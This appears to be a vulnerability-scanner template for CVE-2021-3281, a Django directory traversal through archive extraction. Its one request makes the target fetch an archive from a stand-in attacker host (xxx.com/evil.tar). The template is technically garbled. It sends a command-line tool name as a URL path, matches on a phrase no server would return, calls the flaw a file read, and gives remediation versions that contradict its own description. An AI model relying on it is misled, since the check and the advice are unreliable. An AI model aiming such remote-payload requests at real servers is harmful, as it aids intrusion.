id: CVE-2021-3281

info:
  name: Django Directory Traversal via Archive Extraction
  author: ProjectDiscoveryAI
  severity: medium
  description: In Django 2.2 before 2.2.18, 3.0 before 3.0.12, and 3.1 before 3.1.6, the django.utils.archive.extract method allows directory traversal via an archive with absolute paths or relative paths with dot segments.
  impact: |
    An attacker could exploit this vulnerability to read sensitive files on the server.
  remediation: |
    Upgrade Django to version 3.0.13, 3.1.7, or 3.2.1 or later.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3281
    - https://www.djangoproject.com/weblog/2021/feb/01/security-releases/

http:
  - method: GET
    path:
      - "{{BaseURL}}/django-admin/startapp?template=https://xxx.com/evil.tar"

    matchers:
      - type: word
        words:
          - "Django Directory Traversal"
        part: body
